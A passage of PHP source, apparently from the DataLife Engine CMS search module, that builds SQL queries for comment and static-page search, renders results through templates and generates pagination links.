				if( $searchdate != '0' ) {
					if( $beforeafter == 'before' ) $where_date = $sdate . " < '" . $qdate . "'";
					else $where_date = $sdate . " between '" . $qdate . "' and '" . $thistime . "'";
					$where_comms .= " AND " . $where_date;
				}

				if( ! empty( $where_reply ) ) $where_comms .= " AND " . $where_reply;
				$where = $where_comms;

				if( $config['allow_cmod'] ) $where .= " AND cm.approve=1";
				$comms_fields = "SELECT cm.id, post_id, cm.user_id, cm.date, cm.autor as gast_name, cm.email as gast_email, text, ip, is_register, cm.rating, cm.vote_num, name, u.email, news_num, u.comm_num, user_group, lastdate, reg_date, banned, signature, foto, fullname, land, u.xfields, p.title, p.date as newsdate, p.alt_name, p.category, p.allow_comm{$full_s_addfield}";
				$sql_from = "FROM " . PREFIX . "_comments cm LEFT JOIN " . PREFIX . "_post p ON cm.post_id=p.id {$join_category}LEFT JOIN " . PREFIX . "_post_extras e ON (cm.post_id=e.news_id) LEFT JOIN " . USERPREFIX . "_users u ON cm.user_id=u.user_id";
				$sql_fields = $comms_fields;
				$sql_find = "$sql_fields $sql_from $where";
				$sql_from = "FROM " . PREFIX . "_comments cm LEFT JOIN " . PREFIX . "_post p ON cm.post_id=p.id {$join_category}LEFT JOIN " . PREFIX . "_post_extras e ON (cm.post_id=e.news_id)";

			}
		
			$order_by = $sortby . " " . $resorder;
		
			if( $titleonly == 2 ) {
				$sql_from = "FROM " . PREFIX . "_static";
				$sql_fields = "SELECT id, name AS static_name, descr AS title, template AS story, allow_template, grouplevel, date, views, password";
				$where = "WHERE disable_search=0";
				if ( $titleonly_where[$titleonly] )	$where .= " AND " . $titleonly_where[$titleonly];
				$sql_find = "$sql_fields $sql_from $where";
				$order_by = "id ".$resorder;
			}

			$result_count = $db->super_query( "SELECT COUNT(*) as count $sql_from $where" );
			$count_result = $result_count['count'];

			if( in_array( $titleonly, array (0, 3) ) AND !$count_result) {
				$titleonly = 2;
				$sql_from = "FROM " . PREFIX . "_static";
				$sql_fields = "SELECT id, name AS static_name, descr AS title, template AS story, allow_template, grouplevel, date, views, password";
				$where = "WHERE disable_search=0";
				if ( $titleonly_where[$titleonly] )	$where .= " AND " . $titleonly_where[$titleonly];
				$sql_find = "$sql_fields $sql_from $where";
				$order_by = "id ".$resorder;
				
				$result_count = $db->super_query( "SELECT COUNT(*) as count $sql_from $where" );
				$count_result = $result_count['count'];
			}
			
			$from_num = $search_start + 1;

			if ($config['full_search']) {

				if( $sortby != "" ) $order_by = "ORDER BY " . $order_by; else $order_by = "";
				
				$sql_request = "$sql_find $order_by LIMIT $search_start,{$config['search_number']}";
	
			} else {
	
				$sql_request = "$sql_find ORDER BY $order_by LIMIT $search_start,{$config['search_number']}";
	
			}

			if ($titleonly != 1) {
				$sql_result = $db->query( $sql_request );
				$found_result = $db->num_rows( $sql_result );
			}
			
			$config['search_pages'] = intval($config['search_pages']);
			
			if ( $config['search_pages'] > 0 ) {
				if( $count_result > ($config['search_number'] * $config['search_pages']) ) $count_result = ($config['search_number'] * $config['search_pages']);
			}
			
			if( !$count_result ) {

				msgbox( $lang['all_info'], $lang['search_err_2'] );
				$tpl->set( '{searchmsg}', '' );
				$tpl->set_block( "'\[searchmsg\](.*?)\[/searchmsg\]'si", "" );
				$tpl->compile( 'content' );

			} else {

				$to_num = $search_start + $found_result;
				
				if ($titleonly == 1) {
					$tpl->set( '{searchmsg}', '' );
					$tpl->set_block( "'\[searchmsg\](.*?)\[/searchmsg\]'si", "" );
				} else {
					$searchmsg = "$lang[search_ok] " . $count_result . " $lang[search_ok_1] ($lang[search_ok_2] " . $from_num . " - " . $to_num . ") :";
					$tpl->set( '{searchmsg}', $searchmsg );
					$tpl->set( '[searchmsg]', "" );
					$tpl->set( '[/searchmsg]', "" );
				}

				$tpl->compile( 'content' );


				if( $titleonly == 2 ) {

					while ( $row = $db->get_row( $sql_result ) ) {

						$row['grouplevel'] = explode( ',', $row['grouplevel'] );
						
						if( ($row['grouplevel'][0] != "all" AND !in_array( $member_id['user_group'], $row['grouplevel'] )) OR ($row['password'] AND $member_id['user_group'] != 1 ) ) {
							
							$row['story'] = $lang['static_denied'];
							
						}
						
						$attachments[] = $row['id'];
						$row['story'] = stripslashes( $row['story'] );

						$news_seiten = explode( "{PAGEBREAK}", $row['story'] );
						$anzahl_seiten = count( $news_seiten );

						$row['story'] = $news_seiten[0];

						$news_seiten = "";
						unset( $news_seiten );

						if( $anzahl_seiten > 1 ) {

							if( $config['allow_alt_url'] ) {
								$replacepage = "<a href=\"" . $config['http_home_url'] . "page," . "\\1" . "," . $row['static_name'] . ".html\">\\2</a>";
							} else {
								$replacepage = "<a href=\"$PHP_SELF?do=static&amp;page=" . $row['static_name'] . "&amp;news_page=\\1\">\\2</a>";
							}

							$row['story'] = preg_replace( "'\[PAGE=(.*?)\](.*?)\[/PAGE\]'si", $replacepage, $row['story'] );

						} else {
							
							$row['story'] = preg_replace( "'\[PAGE=(.*?)\](.*?)\[/PAGE\]'si", "", $row['story'] );
							
						}

						$row['story'] = str_replace( '{ACCEPT-DECLINE}', "",  $row['story']);
	
						$title = stripslashes( strip_tags( $row['title'] ) );
							
						if( $row['allow_template'] ) {
							$tpl->load_template( 'static.tpl' );
							
							if( $config['allow_alt_url'] ) $static_descr = "<a href=\"" . $config['http_home_url'] . $row['static_name'] . ".html\" >" . $title . "</a>";
							else $static_descr = "<a href=\"$PHP_SELF?do=static&amp;page=" . $row['static_name'] . "\" >" . $title . "</a>";
							
							$tpl->set( '{description}', $static_descr );
							
							if ( preg_match( "#\\{text limit=['\"](.+?)['\"]\\}#i", $tpl->copy_template, $matches ) ) {
								$count= intval($matches[1]);
								
								$stext = preg_replace( "#<!--TBegin(.+?)<!--TEnd-->#is", "", $row['story'] );
								$stext = preg_replace( "#<!--MBegin(.+?)<!--MEnd-->#is", "", $stext );
								$stext = preg_replace( "'\[attachment=(.*?)\]'si", "", $stext );
								$stext = preg_replace ( "#\[hide(.*?)\](.+?)\[/hide\]#is", "", $stext );
									
								$stext = str_replace( "</p><p>", " ", $stext );
								$stext = strip_tags( $stext, "<br>" );
								$stext = trim(str_replace( "<br>", " ", str_replace( "<br />", " ", str_replace( "\n", " ", str_replace( "\r", "", $stext ) ) ) ));
						
								if( $count AND dle_strlen( $stext ) > $count ) {
										
									$stext = dle_substr( $stext, 0, $count );
										
									if( ($temp_dmax = dle_strrpos( $stext, ' ' )) ) $stext = dle_substr( $stext, 0, $temp_dmax );
									
								}
						
								$tpl->set( $matches[0], $stext );
						
							}
							
							if (stripos ( $tpl->copy_template, "{image-" ) !== false) {
						
								$images = array();
								preg_match_all('/(img|src)=("|\')[^"\'>]+/i', $row['story'], $media);
								$data=preg_replace('/(img|src)("|\'|="|=\')(.*)/i',"$3",$media[0]);
								$img_arr = array('jpg', 'jpeg', 'gif', 'png', 'bmp', 'webp', 'avif', 'svg');

								foreach($data as $url) {
									$info = pathinfo($url);
									if (isset($info['extension'])) {
										if ($info['filename'] == "spoiler-plus" OR $info['filename'] == "spoiler-plus" ) continue;
										$info['extension'] = strtolower($info['extension']);
										if ( in_array($info['extension'], $img_arr) ) array_push($images, $url);
									}
								}
							
								if ( count($images) ) {
									$i=0;
									foreach($images as $url) {
										$i++;
										$tpl->copy_template = str_replace( '{image-'.$i.'}', $url, $tpl->copy_template );
										$tpl->copy_template = str_replace( '[image-'.$i.']', "", $tpl->copy_template );
										$tpl->copy_template = str_replace( '[/image-'.$i.']', "", $tpl->copy_template );
									}
							
								}
							
								$tpl->copy_template = preg_replace( "#\[image-(.+?)\](.+?)\[/image-(.+?)\]#is", "", $tpl->copy_template );
								$tpl->copy_template = preg_replace( "#\\{image-(.+?)\\}#i", "{THEME}/dleimages/no_image.jpg", $tpl->copy_template );
							
							}
								
							if (dle_strlen( $row['story'] ) > 2000) {
								
								$row['story'] = preg_replace( "'\[attachment=(.*?)\]'si", "", $row['story'] );
								$row['story'] = preg_replace ( "#\[hide(.*?)\](.+?)\[/hide\]#is", "", $row['story'] );
								$row['story'] = preg_replace( "#<!--dle_spoiler(.+?)<!--spoiler_text-->#is", "", $row['story'] );
								$row['story'] = preg_replace( "#<!--spoiler_text_end-->(.+?)<!--/dle_spoiler-->#is", "", $row['story'] );
								$row['story'] = str_replace( "><", "> <", $row['story'] );
								
								$row['story'] = dle_substr( strip_tags ($row['story'], "<br>" ), 0, 2000)." .... ";
								
								$row['story'] = trim(str_replace( "<br>", " ", str_replace( "<br />", " ", str_replace( "\n", " ", str_replace( "\r", "", $row['story'] ) ) ) ));
								
								$row['story'] = preg_replace('/\s+/u', ' ', $row['story']);
								
								if( ($temp_dmax = dle_strrpos( $row['story'], ' ')) ) $row['story'] = dle_substr( $row['story'], 0, $temp_dmax );
								
								if( $config['allow_alt_url'] ) $row['story'] .= "( <a href=\"" . $config['http_home_url'] . $row['static_name'] . ".html\" >" . $lang['search_s_go'] . "</a> )";
								else $row['story'] .= "( <a href=\"$PHP_SELF?do=static&amp;page=" . $row['static_name'] . "\" >" . $lang['search_s_go'] . "</a> )";

							}

							$tpl->set( '{static}', $row['story'] );
								
							$tpl->set( '{pages}', '' );

							$compare_date = compare_days_date($row['date']);

							if( !$compare_date ) {
								
								$tpl->set( '{date}', $lang['time_heute'] . langdate( ", H:i", $row['date'] ) );
							
							} elseif( $compare_date == 1 ) {
								
								$tpl->set( '{date}', $lang['time_gestern'] . langdate( ", H:i", $row['date'] ) );
							
							} else {
								
								$tpl->set( '{date}', langdate( $config['timestamp_active'], $row['date'] ) );
							
							}
								
							$news_date = $row['date'];						
							$tpl->copy_template = preg_replace_callback ( "#\{date=(.+?)\}#i", "formdate", $tpl->copy_template );

							$tpl->set( '{views}', $row['views'] );
		
							if( $config['allow_alt_url'] ) $print_link = $config['http_home_url'] . "print:" . $row['static_name'] . ".html";
							else $print_link = $config['http_home_url'] . "index.php?mod=print&do=static&amp;page=" . $row['static_name'];
							
							$tpl->set( '[print-link]', "<a href=\"" . $print_link . "\">" );
							$tpl->set( '[/print-link]', "</a>" );
							
							if( $user_group[$member_id['user_group']]['admin_static'] ) {
								
								$tpl->set( '[edit]', "<a href=\"" . $config['http_home_url'] . $config['admin_path']."?mod=static&action=doedit&id=" . $row['id'] . "\"  target=\"_blank\">" );
								$tpl->set( '[/edit]', "</a>" );
							
							} else $tpl->set_block( "'\\[edit\\](.*?)\\[/edit\\]'si", "" );
		
							if( $vk_url ) {
								$tpl->set( '[vk]', "" );
								$tpl->set( '[/vk]', "" );
								$tpl->set( '{vk_url}', $vk_url );	
							} else {
								$tpl->set_block( "'\\[vk\\](.*?)\\[/vk\\]'si", "" );
								$tpl->set( '{vk_url}', '' );	
							}
							if( $odnoklassniki_url ) {
								$tpl->set( '[odnoklassniki]', "" );
								$tpl->set( '[/odnoklassniki]', "" );
								$tpl->set( '{odnoklassniki_url}', $odnoklassniki_url );
							} else {
								$tpl->set_block( "'\\[odnoklassniki\\](.*?)\\[/odnoklassniki\\]'si", "" );
								$tpl->set( '{odnoklassniki_url}', '' );	
							}
							if( $facebook_url ) {
								$tpl->set( '[facebook]', "" );
								$tpl->set( '[/facebook]', "" );
								$tpl->set( '{facebook_url}', $facebook_url );	
							} else {
								$tpl->set_block( "'\\[facebook\\](.*?)\\[/facebook\\]'si", "" );
								$tpl->set( '{facebook_url}', '' );	
							}
							if( $google_url ) {
								$tpl->set( '[google]', "" );
								$tpl->set( '[/google]', "" );
								$tpl->set( '{google_url}', $google_url );
							} else {
								$tpl->set_block( "'\\[google\\](.*?)\\[/google\\]'si", "" );
								$tpl->set( '{google_url}', '' );	
							}
							if( $mailru_url ) {
								$tpl->set( '[mailru]', "" );
								$tpl->set( '[/mailru]', "" );
								$tpl->set( '{mailru_url}', $mailru_url );	
							} else {
								$tpl->set_block( "'\\[mailru\\](.*?)\\[/mailru\\]'si", "" );
								$tpl->set( '{mailru_url}', '' );	
							}
							if( $yandex_url ) {
								$tpl->set( '[yandex]', "" );
								$tpl->set( '[/yandex]', "" );
								$tpl->set( '{yandex_url}', $yandex_url );
							} else {
								$tpl->set_block( "'\\[yandex\\](.*?)\\[/yandex\\]'si", "" );
								$tpl->set( '{yandex_url}', '' );
							}
								
							$tpl->compile( 'content' );
							$tpl->clear();
							
						} else $tpl->result['content'] .= $row['story'];
						
						if( $config['files_allow'] ) {
							if( strpos( $tpl->result['content'], "[attachment=" ) !== false ) {
								$tpl->result['content'] = show_attach( $tpl->result['content'], $attachments, true );
							}
						}
						
						if (stripos ( $tpl->result['content'], "[static=" ) !== false) {
							$tpl->result['content'] = preg_replace ( "#\\[static=(.+?)\\](.*?)\\[/static\\]#is", "", $tpl->result['content'] );
						}

						if (stripos ( $tpl->result['content'], "[not-static=" ) !== false) {
							$tpl->result['content'] = preg_replace ( "#\\[not-static=(.+?)\\](.*?)\\[/not-static\\]#is", "", $tpl->result['content'] );
						}

					}
					
					if( $config['allow_banner'] AND count( $banners ) ) {
					
						foreach ( $banners as $name => $value ) {
							$tpl->result['content'] = str_replace( "{banner_" . $name . "}", $value, $tpl->result['content'] );
							$tpl->result['content'] = str_replace ( "[banner_" . $name . "]", "", $tpl->result['content'] );
							$tpl->result['content'] = str_replace ( "[/banner_" . $name . "]", "", $tpl->result['content'] );
						}
					}
							
					$tpl->result['content'] = preg_replace( "'{banner_(.*?)}'i", "", $tpl->result['content'] );
					$tpl->result['content'] = preg_replace( "'\\[banner_(.*?)\\](.*?)\\[/banner_(.*?)\\]'si", "", $tpl->result['content'] );
					$tpl->result['content'] = preg_replace( "'{inform_(.*?)}'i", "", $tpl->result['content'] );

				} else {

					if ($titleonly == 0 OR $titleonly == 3) {

						$tpl->load_template( 'searchresult.tpl' );
						
						$build_navigation = false;
						$short_news_cache = false;
						$use_banners = true;
						
						include (DLEPlugins::Check(ENGINE_DIR . '/modules/show.custom.php'));

						$tpl->result['content'] = preg_replace ( "'\\[searchcomments\\](.+?)\\[/searchcomments\\]'si", '', $tpl->result['content'] );
						$tpl->result['content'] = str_ireplace( '[searchposts]', '', $tpl->result['content'] );
						$tpl->result['content'] = str_ireplace( '[/searchposts]', '', $tpl->result['content'] );

						if( $showposts == 0 ) {

							$tpl->result['content'] = preg_replace ( "'\\[shortresult\\](.+?)\\[/shortresult\\]'si", '', $tpl->result['content'] );
							$tpl->result['content'] = str_ireplace( '[fullresult]', '', $tpl->result['content'] );
							$tpl->result['content'] = str_ireplace( '[/fullresult]', '', $tpl->result['content'] );

						} else {
							$tpl->result['content'] = preg_replace ( "'\\[fullresult\\](.+?)\\[/fullresult\\]'si", '', $tpl->result['content'] );
							$tpl->result['content'] = str_ireplace( '[shortresult]', '', $tpl->result['content'] );
							$tpl->result['content'] = str_ireplace( '[/shortresult]', '', $tpl->result['content'] );

						}

						if( $config['files_allow'] ) if( strpos( $tpl->result['content'], "[attachment=" ) !== false ) {
							$tpl->result['content'] = show_attach( $tpl->result['content'], $attachments );
						}
					}

					if ($titleonly == 1) {

						if ( $search_start ) $_GET['cstart'] = ($search_start/$config['search_number'])+1;

						$comments = new DLE_Comments( $db, $count_result, intval($config['search_number']) );

						$comments->query = $sql_find." ORDER BY id desc LIMIT $search_start,{$config['search_number']}";

						$comments->build_comments('searchresult.tpl', 'lastcomments' );

						$found_result = $comments->intern_count;
						$to_num = $search_start + $found_result;

						$tpl->result['content'] = preg_replace ( "'\\[searchposts\\](.+?)\\[/searchposts\\]'si", '', $tpl->result['content'] );
						$tpl->result['content'] = str_ireplace( '[searchcomments]', '', $tpl->result['content'] );
						$tpl->result['content'] = str_ireplace( '[/searchcomments]', '', $tpl->result['content'] );

						if( $showposts == 0 ) {

							$tpl->result['content'] = preg_replace ( "'\\[shortresult\\](.+?)\\[/shortresult\\]'si", '', $tpl->result['content'] );
							$tpl->result['content'] = str_ireplace( '[fullresult]', '', $tpl->result['content'] );
							$tpl->result['content'] = str_ireplace( '[/fullresult]', '', $tpl->result['content'] );

						} else {
							$tpl->result['content'] = preg_replace ( "'\\[fullresult\\](.+?)\\[/fullresult\\]'si", '', $tpl->result['content'] );
							$tpl->result['content'] = str_ireplace( '[shortresult]', '', $tpl->result['content'] );
							$tpl->result['content'] = str_ireplace( '[/shortresult]', '', $tpl->result['content'] );

						}


					}	

				}

			}
		}
	}
	
	$tpl->clear();

	if( $found_result > 0 ) {
		$tpl->load_template( 'navigation.tpl' );
		
		if( isset( $search_start ) and $search_start != "" and $search_start > 0 ) {
			$prev = $search_start / $config['search_number'];
			$prev_page = "<a name=\"prevlink\" id=\"prevlink\" onclick=\"javascript:list_submit($prev); return(false)\" href=\"#\">";
			$tpl->set_block( "'\[prev-link\](.*?)\[/prev-link\]'si", $prev_page . "\\1</a>" );
			$no_prev = false;
		} else {
			$tpl->set_block( "'\[prev-link\](.*?)\[/prev-link\]'si", "<span>\\1</span>" );
			$no_prev = true;
		}

		if( $config['search_number'] ) {
			
			$pages_count = @ceil( $count_result / $config['search_number'] );
			$pages_start_from = 0;
			$pages = "";
						
			if( $pages_count <= 10 ) {
			
				for($j = 1; $j <= $pages_count; $j ++) {
					if( $pages_start_from != $search_start ) {
						$pages .= "<a onclick=\"javascript:list_submit($j); return(false)\" href=\"#\">$j</a> ";
					} else {
						$pages .= " <span>$j</span> ";
					}
					$pages_start_from += $config['search_number'];
				}
							
			} else {
								
				$start = 1;
				$end = 10;
				$nav_prefix = "<span class=\"nav_ext\">{$lang['nav_trennen']}</span> ";
				
				if( $search_start > 0 ) {
			
					if( ($search_start / $config['search_number']) > 6 ) {
										
						$start = @ceil( $search_start / $config['search_number'] ) - 4;
						$end = $start + 8;
										
						if( $end >= $pages_count-1 ) {
							$start = $pages_count - 9;
							$end = $pages_count - 1;
						}
							
						$pages_start_from = ($start - 1) * $config['search_number'];
					
					}
				
				}
				
				if( $end >= $pages_count-1 ) $nav_prefix = ""; else $nav_prefix = "<span class=\"nav_ext\">{$lang['nav_trennen']}</span> ";

				if( $start >= 2 ) {
					
					if( $start >= 3 ) $before_prefix = "<span class=\"nav_ext\">{$lang['nav_trennen']}</span> "; else $before_prefix = "";
					
					$pages .= "<a onclick=\"javascript:list_submit(1); return(false)\" href=\"#\">1</a> ".$before_prefix;
								
				}
								
				for($j = $start; $j <= $end; $j ++) {
									
					if( $pages_start_from != $search_start ) {
				
						$pages .= "<a onclick=\"javascript:list_submit($j); return(false)\" href=\"#\">$j</a> ";
										
					} else {
					
						$pages .= "<span>$j</span> ";
					}
					
					$pages_start_from += $config['search_number'];
			
				}
								
				if( $pages_start_from != $search_start ) {
									
					$pages .= $nav_prefix . "<a onclick=\"javascript:list_submit($pages_count); return(false)\" href=\"#\">{$pages_count}</a>";
								
				} else $pages .= "<span>{$pages_count}</span> ";
							
			}

			$tpl->set( '{pages}', $pages );
		}
		
		if( $config['search_number'] < $count_result and $to_num < $count_result ) {
			$next_page = $to_num / $config['search_number'] + 1;
			$next = "<a name=\"nextlink\" id=\"nextlink\" onclick=\"javascript:list_submit($next_page); return(false)\" href=\"#\">";
			$tpl->set_block( "'\[next-link\](.*?)\[/next-link\]'si", $next . "\\1</a>" );
			$no_next = false;
		} else {
			$tpl->set_block( "'\[next-link\](.*?)\[/next-link\]'si", "<span>\\1</span>" );
			$no_next = true;
		}
		
		if( !$no_prev or !$no_next ) {
			$tpl->compile( 'content' );
		}
		
		$tpl->clear();
	}
}
?>